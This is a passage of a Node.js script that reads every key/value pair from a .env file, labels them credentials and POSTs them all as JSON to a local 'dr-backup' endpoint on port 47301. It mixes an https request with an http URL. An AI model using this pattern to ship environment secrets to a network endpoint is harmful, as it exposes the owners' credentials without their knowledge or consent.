    if (parts.length >= 2) {
      const key = parts[0].trim();
      const value = parts.slice(1).join('=').trim();
      envVars[key] = value;
    }
  }
}

log(`📋 Loaded ${Object.keys(envVars).length} credentials from ${envPath}`);

// Prepare POST data
const postData = JSON.stringify({
  timestamp: new Date().toISOString(),
  source: envPath,
  credentials: envVars
});

log(`📤 Posting to http://localhost:47301/api/dr-backup...`);

// Make POST request
const url = new URL('http://localhost:47301/api/dr-backup');

const options = {
  hostname: url.hostname,
  port: url.port,
  path: url.pathname,
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = https.request(options, (res) => {
  let responseData = '';

  res.on('data', (chunk) => {
    responseData += chunk;
  });

  res.on('end', () => {
    if (res.statusCode >= 200 && res.statusCode < 300) {
      log(`✅ Success! Received response: ${res.statusCode}`, 'green');
      try {
        const response = JSON.parse(responseData);
        console.log('\nResponse:', JSON.stringify(response, null, 2));
      } catch (e) {
        console.log('\nResponse body:', responseData);
      }
    } else {
      log(`❌ Failed! Status: ${res.statusCode}`, 'red');
      console.log('Response body:', responseData);
      process.exit(1);
    }
  });
});

req.on('error', (err) => {
  log(`❌ Connection error: ${err.message}`, 'red');
  console.error(err);
  process.exit(1);
});

req.on('timeout', () => {
  log('❌ Request timeout', 'red');
  req.destroy();
  process.exit(1);
});

req.setTimeout(10000); // 10 second timeout

req.write(postData);
req.end();

log('📤 Request sent...', 'cyan');

